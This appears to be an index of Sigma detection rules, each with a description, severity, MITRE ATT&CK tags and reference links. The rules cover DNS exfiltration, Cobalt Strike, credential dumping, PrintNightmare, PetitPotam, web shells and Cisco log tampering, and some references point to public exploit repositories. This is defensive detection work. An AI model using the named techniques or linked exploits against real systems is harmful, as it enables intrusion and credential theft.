    Detects disabling security tools

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/other/lnx_security_tools_disabling_syslog.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.004/T1562.004.md

    
### Relevant ClamAV Message
    
    Detects relevant ClamAV messages

    * Level: high
    * MITRE: attack.resource_development
    * MITRE: attack.t1588.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/other/lnx_clamav.yml
* https://github.com/ossec/ossec-hids/blob/master/etc/rules/clam_av_rules.xml

    
### SSHD Error Message CVE-2018-15473
    
    Detects exploitation attempt using public exploit code for CVE-2018-15473

    * Level: medium
    * MITRE: attack.reconnaissance
    * MITRE: attack.t1589
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/other/lnx_ssh_cve_2018_15473.yml
* https://github.com/Rhynorater/CVE-2018-15473-Exploit

    
### Suspicious Named Error
    
    Detects suspicious DNS error messages that indicate a fatal or suspicious error that could be caused by exploiting attempts

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/other/lnx_susp_named.yml
* https://github.com/ossec/ossec-hids/blob/master/etc/rules/named_rules.xml

    
### Failed Logins with Different Accounts from Single Source System
    
    Detects suspicious failed logins with different user accounts from a single source system

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1110
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/other/lnx_susp_failed_logons_single_source.yml
    
### Suspicious VSFTPD Error Messages
    
    Detects suspicious VSFTPD error messages that indicate a fatal or suspicious error that could be caused by exploiting attempts

    * Level: medium
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/other/lnx_susp_vsftp.yml
* https://github.com/dagwieers/vsftpd/

    
### Possible DNS Tunneling
    
    Normally, DNS logs contain a limited amount of different dns queries for a single domain. This rule detects a high amount of queries for a single domain, which can be an indicator that DNS is used to transfer data.

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.004
    * MITRE: attack.exfiltration
    * MITRE: attack.t1048.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/net_dns_c2_detection.yml
* https://zeltser.com/c2-dns-tunneling/

* https://patrick-bareiss.com/detect-c2-traffic-over-dns-using-sigma/

    
### High DNS Requests Rate
    
    High DNS requests amount from host per short period of time

    * Level: medium
    * MITRE: attack.exfiltration
    * MITRE: attack.t1048.003
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/net_firewall_high_dns_requests_rate.yml
    
### Telegram Bot API Request
    
    Detects suspicious DNS queries to api.telegram.org used by Telegram Bots of any kind

    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1102.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/net_susp_telegram_api.yml
* https://core.telegram.org/bots/faq

* https://researchcenter.paloaltonetworks.com/2018/03/unit42-telerat-another-android-trojan-leveraging-telegrams-bot-api-to-target-iranian-users/

* https://blog.malwarebytes.com/threat-analysis/2016/11/telecrypt-the-ransomware-abusing-telegram-api-defeated/

* https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/

    
### High TXT Records Requests Rate
    
    Extremely high rate of TXT record type DNS requests from host per short period of time. Possible result of Do-exfiltration tool execution

    * Level: medium
    * MITRE: attack.exfiltration
    * MITRE: attack.t1048.003
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/net_high_txt_records_requests_rate.yml
    
### DNS TXT Answer with Possible Execution Strings
    
    Detects strings used in command execution in DNS TXT Answer

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/net_susp_dns_txt_exec_strings.yml
* https://twitter.com/stvemillertime/status/1024707932447854592

* https://github.com/samratashok/nishang/blob/master/Backdoors/DNS_TXT_Pwnage.ps1

    
### Network Scans Count By Destination IP
    
    Detects many failed connection attempts to different ports or hosts

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1046
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/net_susp_network_scan_by_ip.yml
    
### Cobalt Strike DNS Beaconing
    
    Detects suspicious DNS queries known from Cobalt Strike beacons

    * Level: critical
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/net_mal_dns_cobaltstrike.yml
* https://www.icebrg.io/blog/footprints-of-fin7-tracking-actor-patterns

* https://www.sekoia.io/en/hunting-and-detecting-cobalt-strike/

    
### High DNS Requests Rate
    
    High DNS requests amount from host per short period of time

    * Level: medium
    * MITRE: attack.exfiltration
    * MITRE: attack.t1048.003
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/net_high_dns_requests_rate.yml
    
### Suspicious DNS Query with B64 Encoded String
    
    Detects suspicious DNS queries using base64 encoding

    * Level: medium
    * MITRE: attack.exfiltration
    * MITRE: attack.t1048.003
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/net_susp_dns_b64_queries.yml
* https://github.com/krmaxwell/dns-exfiltration

    
### Equation Group C2 Communication
    
    Detects communication to C2 servers mentioned in the operational notes of the ShadowBroker leak of EquationGroup C2 tools

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.g0020
    * MITRE: attack.t1041
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/net_apt_equationgroup_c2.yml
* https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation

* https://medium.com/@msuiche/the-nsa-compromised-swift-network-50ec3000b195

    
### High DNS Bytes Out
    
    High DNS queries bytes amount from host per short period of time

    * Level: medium
    * MITRE: attack.exfiltration
    * MITRE: attack.t1048.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/net_high_dns_bytes_out.yml
    
### Monero Crypto Coin Mining Pool Lookup
    
    Detects suspicious DNS queries to Monero mining pools

    * Level: high
    * MITRE: attack.impact
    * MITRE: attack.t1496
    * MITRE: attack.t1567
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/net_pua_cryptocoin_mining_xmr.yml
* https://www.nextron-systems.com/2021/10/24/monero-mining-pool-fqdns/

    
### High NULL Records Requests Rate
    
    Extremely high rate of NULL record type DNS requests from host per short period of time. Possible result of iodine tool execution

    * Level: medium
    * MITRE: attack.exfiltration
    * MITRE: attack.t1048.003
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/net_high_null_records_requests_rate.yml
    
### Network Scans Count By Destination Port
    
    Detects many failed connection attempts to different ports or hosts

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1046
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/net_susp_network_scan_by_port.yml
    
### High DNS Bytes Out
    
    High DNS queries bytes amount from host per short period of time

    * Level: medium
    * MITRE: attack.exfiltration
    * MITRE: attack.t1048.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/net_firewall_high_dns_bytes_out.yml
    
### Wannacry Killswitch Domain
    
    Detects wannacry killswitch domain dns queries

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/net_wannacry_killswitch_domain.yml
* https://www.fireeye.com/blog/products-and-services/2017/05/wannacry-ransomware-campaign.html

    
### Possible PrintNightmare Print Driver Install
    
    Detects the remote installation of a print driver which is possible indication of the exploitation of PrintNightmare (CVE-2021-1675).
The occurrence of print drivers being installed remotely via RPC functions should be rare, as print drivers are normally installed locally and or through group policy.


    * Level: medium
    * MITRE: attack.execution
    * MITRE: cve.2021.1678
    * MITRE: cve.2021.1675
    * MITRE: cve.2021.34527
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/zeek/zeek_dce_rpc_printnightmare_print_driver_install.yml
* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-par/93d1915d-4d9f-4ceb-90a7-e8f2a59adc29

* https://github.com/zeek/zeek/blob/master/scripts/base/protocols/dce-rpc/consts.zeek

* https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527

* https://github.com/corelight/CVE-2021-1675

* https://github.com/SigmaHQ/sigma/blob/master/rules/network/zeek/zeek_dce_rpc_mitre_bzar_persistence.yml

* https://old.zeek.org/zeekweek2019/slides/bzar.pdf

* https://www.crowdstrike.com/blog/cve-2021-1678-printer-spooler-relay-security-advisory/

    
### New Kind of Network (NKN) Detection
    
    NKN is a networking service using blockchain technology to support a decentralized network of peers. While there are legitimate uses for it, it can also be used as a C2 channel. This rule looks for a DNS request to the ma>

    * Level: low
    * MITRE: attack.command_and_control
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/zeek/zeek_dns_nkn.yml
* https://github.com/nknorg/nkn-sdk-go

* https://unit42.paloaltonetworks.com/manageengine-godzilla-nglite-kdcsponge/

* https://github.com/Maka8ka/NGLite

    
### SMB Spoolss Name Piped Usage
    
    Detects the use of the spoolss named pipe over SMB. This can be used to trigger the authentication via NTLM of any machine that has the spoolservice enabled.

    * Level: medium
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/zeek/zeek_dce_rpc_smb_spoolss_named_pipe.yml
* https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1

* https://dirkjanm.io/a-different-way-of-abusing-zerologon/

* https://twitter.com/_dirkjan/status/1309214379003588608

    
### Suspicious Access to Sensitive File Extensions - Zeek
    
    Detects known sensitive file extensions via Zeek

    * Level: medium
    * MITRE: attack.collection
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/zeek/zeek_smb_converted_win_susp_raccess_sensitive_fext.yml
* https://github.com/neo23x0/sigma/blob/d42e87edd741dd646db946f30964f331f92f50e6/rules/windows/builtin/win_susp_raccess_sensitive_fext.yml

    
### Default Cobalt Strike Certificate
    
    Detects the presence of default Cobalt Strike certificate in the HTTPS traffic

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.s0154
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/zeek/zeek_default_cobalt_strike_certificate.yml
* https://sergiusechel.medium.com/improving-the-network-based-detection-of-cobalt-strike-c2-servers-in-the-wild-while-reducing-the-6964205f6468

    
### DNS Events Related To Mining Pools
    
    Identifies clients that may be performing DNS lookups associated with common currency mining pools.

    * Level: low
    * MITRE: attack.t1569.002
    * MITRE: attack.t1496
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/zeek/zeek_dns_mining_pools.yml
* https://github.com/Azure/Azure-Sentinel/blob/master/Detections/ASimDNS/imDNS_Miners.yaml

    
### Suspicious PsExec Execution - Zeek
    
    detects execution of psexec or paexec with renamed service name, this rule helps to filter out the noise if psexec is used for legit purposes or if attacker uses a different psexec client other than sysinternal one

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/zeek/zeek_smb_converted_win_susp_psexec.yml
* https://github.com/neo23x0/sigma/blob/d42e87edd741dd646db946f30964f331f92f50e6/rules/windows/builtin/win_susp_psexec.yml

    
### Kerberos Network Traffic RC4 Ticket Encryption
    
    Detects kerberos TGS request using RC4 encryption which may be indicative of kerberoasting

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1558.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/zeek/zeek_susp_kerberos_rc4.yml
* https://adsecurity.org/?p=3458

    
### MITRE BZAR Indicators for Execution
    
    Windows DCE-RPC functions which indicate an execution techniques on the remote system. All credit for the Zeek mapping of the suspicious endpoint/operation field goes to MITRE

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1047
    * MITRE: attack.t1053.002
    * MITRE: attack.t1569.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/zeek/zeek_dce_rpc_mitre_bzar_execution.yml
* https://github.com/mitre-attack/bzar#indicators-for-attck-execution

    
### WebDav Put Request
    
    A General detection for WebDav user-agent being used to PUT files on a WebDav network share. This could be an indicator of exfiltration.

    * Level: low
    * MITRE: attack.exfiltration
    * MITRE: attack.t1048.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/zeek/zeek_http_webdav_put_request.yml
* https://github.com/OTRF/detection-hackathon-apt29/issues/17

    
### Domain User Enumeration Network Recon 01
    
    Domain user and group enumeration via network reconnaissance. Seen in APT 29 and other common tactics and actors. Detects a set of RPC (remote procedure calls) used to enumerate a domain controller. The rule was created based off the datasets and hackathon from https://github.com/OTRF/detection-hackathon-apt29

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1087.002
    * MITRE: attack.t1082
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/zeek/zeek_dce_rpc_domain_user_enumeration.yml
* https://github.com/OTRF/detection-hackathon-apt29

* https://github.com/OTRF/detection-hackathon-apt29/issues/37

    
### Publicly Accessible RDP Service
    
    Detects connections from routable IPs to an RDP listener - which is indicative of a publicly-accessible RDP service.

    * Level: high
    * MITRE: attack.t1021.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/zeek/zeek_rdp_public_listener.yml
* https://attack.mitre.org/techniques/T1021/001/

    
### First Time Seen Remote Named Pipe - Zeek
    
    This detection excludes known namped pipes accessible remotely and notify on newly observed ones, may help to detect lateral movement and remote exec using named pipes

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/zeek/zeek_smb_converted_win_lm_namedpipe.yml
* https://github.com/neo23x0/sigma/blob/d42e87edd741dd646db946f30964f331f92f50e6/rules/windows/builtin/win_lm_namedpipe.yml

    
### Possible Impacket SecretDump Remote Activity - Zeek
    
    Detect AD credential dumping using impacket secretdump HKTL. Based on the SIGMA rules/windows/builtin/win_impacket_secretdump.yml

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.002
    * MITRE: attack.t1003.004
    * MITRE: attack.t1003.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/zeek/zeek_smb_converted_win_impacket_secretdump.yml
* https://blog.menasec.net/2019/02/threat-huting-10-impacketsecretdump.html

    
### OMIGOD HTTP No Authentication RCE
    
    Detects the exploitation of OMIGOD (CVE-2021-38647) which allows remote execute (RCE) commands as root with just a single unauthenticated HTTP request. Verify, successful, exploitation by viewing the HTTP client (request) body to see what was passed to the server (using PCAP). Within the client body is where the code execution would occur. Additionally, check the endpoint logs to see if suspicious commands or activity occurred within the timeframe of this HTTP request.

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.initial_access
    * MITRE: attack.execution
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1068
    * MITRE: attack.t1190
    * MITRE: attack.t1203
    * MITRE: attack.t1021.006
    * MITRE: attack.t1210
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/zeek/zeek_http_omigod_no_auth_rce.yml
* https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure

* https://twitter.com/neu5ron/status/1438987292971053057?s=20

    
### Remote Task Creation via ATSVC Named Pipe - Zeek
    
    Detects remote task creation via at.exe or API interacting with ATSVC namedpipe

    * Level: medium
    * MITRE: attack.lateral_movement
    * MITRE: attack.persistence
    * MITRE: car.2013-05-004
    * MITRE: car.2015-04-001
    * MITRE: attack.t1053.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/zeek/zeek_smb_converted_win_atsvc_task.yml
* https://github.com/neo23x0/sigma/blob/d42e87edd741dd646db946f30964f331f92f50e6/rules/windows/builtin/win_atsvc_task.yml

    
### MITRE BZAR Indicators for Persistence
    
    Windows DCE-RPC functions which indicate a persistence techniques on the remote system. All credit for the Zeek mapping of the suspicious endpoint/operation field goes to MITRE.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1547.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/zeek/zeek_dce_rpc_mitre_bzar_persistence.yml
* https://github.com/mitre-attack/bzar#indicators-for-attck-persistence

    
### Executable from Webdav
    
    Detects executable access via webdav6. Can be seen in APT 29 such as from the emulated APT 29 hackathon https://github.com/OTRF/detection-hackathon-apt29/

    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/zeek/zeek_http_executable_download_from_webdav.yml
* http://carnal0wnage.attackresearch.com/2012/06/webdav-server-to-download-custom.html

* https://github.com/OTRF/detection-hackathon-apt29

    
### Suspicious DNS Z Flag Bit Set
    
    The DNS Z flag is bit within the DNS protocol header that is, per the IETF design, meant to be used reserved (unused). Although recently it has been used in DNSSec, the value being set to anything other than 0 should be rare. Otherwise if it is set to non 0 and DNSSec is being used, then excluding the legitimate domains is low effort and high reward. Determine if multiple of these files were accessed in a short period of time to further enhance the possibility of seeing if this was a one off or the possibility of larger sensitive file gathering. This Sigma query is designed to accompany the Corelight Threat Hunting Guide, which can be found here: https://www3.corelight.com/corelights-introductory-guide-to-threat-hunting-with-zeek-bro-logs

    * Level: medium
    * MITRE: attack.t1095
    * MITRE: attack.t1571
    * MITRE: attack.command_and_control
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/zeek/zeek_dns_susp_zbit_flag.yml
* https://twitter.com/neu5ron/status/1346245602502443009

* https://tdm.socprime.com/tdm/info/eLbyj4JjI15v#sigma

* https://tools.ietf.org/html/rfc2929#section-2.1

* https://www.netresec.com/?page=Blog&month=2021-01&post=Finding-Targeted-SUNBURST-Victims-with-pDNS

    
### Potential PetitPotam Attack Via EFS RPC Calls
    
    Detects usage of the windows RPC library Encrypting File System Remote Protocol (MS-EFSRPC). Variations of this RPC are used within the attack refereed to as PetitPotam.
The usage of this RPC function should be rare if ever used at all.
Thus usage of this function is uncommon enough that any usage of this RPC function should warrant further investigation to determine if it is legitimate.
 View surrounding logs (within a few minutes before and after) from the Source IP to. Logs from from the Source IP would include dce_rpc, smb_mapping, smb_files, rdp, ntlm, kerberos, etc..'


    * Level: medium
    * MITRE: attack.t1557.001
    * MITRE: attack.t1187
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/zeek/zeek_dce_rpc_potential_petit_potam_efs_rpc_call.yml
* https://github.com/topotam/PetitPotam/blob/main/PetitPotam/PetitPotam.cpp

* https://msrc.microsoft.com/update-guide/vulnerability/ADV210003

* https://vx-underground.org/archive/Symantec/windows-vista-network-attack-07-en.pdf

* https://threatpost.com/microsoft-petitpotam-poc/168163/

    
### Transferring Files with Credential Data via Network Shares - Zeek
    
    Transferring files with well-known filenames (sensitive files with credential data) using network shares

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.002
    * MITRE: attack.t1003.001
    * MITRE: attack.t1003.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/zeek/zeek_smb_converted_win_transferring_files_with_credential_data.yml
* https://github.com/neo23x0/sigma/blob/373424f14574facf9e261d5c822345a282b91479/rules/windows/builtin/win_transferring_files_with_credential_data_via_network_shares.yml

    
### DNS TOR Proxies
    
    Identifies IPs performing DNS lookups associated with common Tor proxies.

    * Level: medium
    * MITRE: attack.t1048
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/zeek/zeek_dns_torproxy.yml
* https://github.com/Azure/Azure-Sentinel/blob/master/Detections/ASimDNS/imDNS_TorProxies.yaml

    
### Cisco Denial of Service
    
    Detect a system being shutdown or put into different boot mode

    * Level: medium
    * MITRE: attack.impact
    * MITRE: attack.t1495
    * MITRE: attack.t1529
    * MITRE: attack.t1565.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/cisco/aaa/cisco_cli_dos.yml
    
### Cisco Modify Configuration
    
    Modifications to a config that will serve an adversary's impacts or persistence

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.impact
    * MITRE: attack.t1490
    * MITRE: attack.t1505
    * MITRE: attack.t1565.002
    * MITRE: attack.t1053
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/cisco/aaa/cisco_cli_modify_config.yml
    
### Cisco Disabling Logging
    
    Turn off logging locally or remote

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/cisco/aaa/cisco_cli_disable_logging.yml
    
### Cisco File Deletion
    
    See what files are being deleted from flash file systems

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.impact
    * MITRE: attack.t1070.004
    * MITRE: attack.t1561.001
    * MITRE: attack.t1561.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/cisco/aaa/cisco_cli_file_deletion.yml
    
### Cisco Clear Logs
    
    Clear command history in network OS which is used for defense evasion

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/cisco/aaa/cisco_cli_clear_logs.yml
    
### Cisco Stage Data
    
    Various protocols maybe used to put data on the device for exfil or infil

    * Level: low
    * MITRE: attack.collection
    * MITRE: attack.lateral_movement
    * MITRE: attack.command_and_control
    * MITRE: attack.exfiltration
    * MITRE: attack.t1074
    * MITRE: attack.t1105
    * MITRE: attack.t1560.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/cisco/aaa/cisco_cli_moving_data.yml
    
### Cisco Sniffing
    
    Show when a monitor or a span/rspan is setup or modified

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.discovery
    * MITRE: attack.t1040
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/cisco/aaa/cisco_cli_net_sniff.yml
    
### Cisco Collect Data
    
    Collect pertinent data from the configuration files

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.credential_access
    * MITRE: attack.collection
    * MITRE: attack.t1087.001
    * MITRE: attack.t1552.001
    * MITRE: attack.t1005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/cisco/aaa/cisco_cli_collect_data.yml
    
### Cisco Show Commands Input
    
    See what commands are being input into the device by other people, full credentials can be in the history

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1552.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/cisco/aaa/cisco_cli_input_capture.yml
    
### Cisco Crypto Commands
    
    Show when private keys are being exported from the device, or when new certificates are installed

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1553.004
    * MITRE: attack.t1552.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/cisco/aaa/cisco_cli_crypto_actions.yml
    
### Cisco Discovery
    
    Find information about network devices that is not stored in config files

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1083
    * MITRE: attack.t1201
    * MITRE: attack.t1057
    * MITRE: attack.t1018
    * MITRE: attack.t1082
    * MITRE: attack.t1016
    * MITRE: attack.t1049
    * MITRE: attack.t1033
    * MITRE: attack.t1124
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/cisco/aaa/cisco_cli_discovery.yml
    
### Cisco Local Accounts
    
    Find local accounts being created or modified as well as remote authentication configurations

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1136.001
    * MITRE: attack.t1098
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/network/cisco/aaa/cisco_cli_local_accounts.yml
    
### Django Framework Exceptions
    
    Detects suspicious Django web application framework exceptions that could indicate exploitation attempts

    * Level: medium
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/django/appframework_django_exceptions.yml
* https://docs.djangoproject.com/en/1.11/ref/exceptions/

* https://docs.djangoproject.com/en/1.11/topics/logging/#django-security

    
### Spring Framework Exceptions
    
    Detects suspicious Spring framework exceptions that could indicate exploitation attempts

    * Level: medium
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/spring/appframework_spring_exceptions.yml
* https://docs.spring.io/spring-security/site/docs/current/apidocs/overview-tree.html

    
### Antivirus Password Dumper Detection
    
    Detects a highly relevant Antivirus alert that reports a password dumper

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1003
    * MITRE: attack.t1558
    * MITRE: attack.t1003.001
    * MITRE: attack.t1003.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/antivirus/av_password_dumper.yml
* https://www.nextron-systems.com/2018/09/08/test-event-analysis-cheat-sheet-v1-4/

* https://www.virustotal.com/gui/file/5fcda49ee7f202559a6cbbb34edb65c33c9a1e0bde9fa2af06a6f11b55ded619/detection

    
### Antivirus Hacktool Detection
    
    Detects a highly relevant Antivirus alert that reports a hack tool or other attack tool

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1204
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/antivirus/av_hacktool.yml
* https://www.nextron-systems.com/2021/08/16/test-event-analysis-cheat-sheet-v1-8-2/

    
### Antivirus Ransomware Detection
    
    Detects a highly relevant Antivirus alert that reports ransomware

    * Level: critical
    * MITRE: attack.t1486
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/antivirus/av_ransomware.yml
* https://www.nextron-systems.com/?s=test

    
### Antivirus Exploitation Framework Detection
    
    Detects a highly relevant Antivirus alert that reports an exploitation framework

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1203
    * MITRE: attack.command_and_control
    * MITRE: attack.t1219
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/antivirus/av_exploiting.yml
* https://www.nextron-systems.com/2018/09/08/test-event-analysis-cheat-sheet-v1-4/

    
### Antivirus Web Shell Detection
    
    Detects a highly relevant Antivirus alert that reports a web shell. It's highly recommended to tune this rule to the specific strings used by your anti virus solution by downloading a big webshell repo from e.g. github and checking the matches.

    * Level: critical
    * MITRE: attack.persistence
    * MITRE: attack.t1505.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/antivirus/av_webshell.yml
* https://www.nextron-systems.com/2021/03/25/test-event-analysis-cheat-sheet-v1-8/

* https://github.com/tennc/webshell

* https://www.virustotal.com/gui/file/bd1d52289203866645e556e2766a21d2275877fbafa056a76fe0cf884b7f8819/detection

* https://www.virustotal.com/gui/file/308487ed28a3d9abc1fec7ebc812d4b5c07ab025037535421f64c60d3887a3e8/detection

* https://www.virustotal.com/gui/file/7d3cb8a8ff28f82b07f382789247329ad2d7782a72dde9867941f13266310c80/detection

* https://www.virustotal.com/gui/file/e841675a4b82250c75273ebf0861245f80c6a1c3d5803c2d995d9d3b18d5c4b5/detection

* https://www.virustotal.com/gui/file/a80042c61a0372eaa0c2c1e831adf0d13ef09feaf71d1d20b216156269045801/detection

* https://www.virustotal.com/gui/file/b219f7d3c26f8bad7e175934cd5eda4ddb5e3983503e94ff07d39c0666821b7e/detection

* https://www.virustotal.com/gui/file/b8702acf32fd651af9f809ed42d15135f842788cd98d81a8e1b154ee2a2b76a2/detection

    
### Antivirus PrinterNightmare CVE-2021-34527 Exploit Detection
    
    Detects the suspicious file that is created from PoC code against Windows Print Spooler Remote Code Execution Vulnerability CVE-2021-34527 (PrinterNightmare), CVE-2021-1675 .

    * Level: critical
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1055
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/antivirus/av_printernightmare_cve_2021_34527.yml
* https://twitter.com/mvelazco/status/1410291741241102338

* https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675

* https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527

    
### Antivirus Relevant File Paths Alerts
    
    Detects an Antivirus alert in a highly relevant file path or with a relevant file name

    * Level: high
    * MITRE: attack.resource_development
    * MITRE: attack.t1588
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/antivirus/av_relevant_files.yml
* https://www.nextron-systems.com/2021/03/25/test-event-analysis-cheat-sheet-v1-8/

    
### Suspicious SQL Error Messages
    
    Detects SQL error messages that indicate probing for an injection attack

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/sql/app_sqlinjection_errors.yml
* http://www.sqlinjection.net/errors

    
### Ruby on Rails Framework Exceptions
    
    Detects suspicious Ruby on Rails exceptions that could indicate exploitation attempts

    * Level: medium
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/ruby/appframework_ruby_on_rails_exceptions.yml
* http://edgeguides.rubyonrails.org/security.html

* http://guides.rubyonrails.org/action_controller_overview.html

* https://stackoverflow.com/questions/25892194/does-rails-come-with-a-not-authorized-exception

* https://github.com/rails/rails/blob/master/actionpack/lib/action_dispatch/middleware/exception_wrapper.rb

    
### Python SQL Exceptions
    
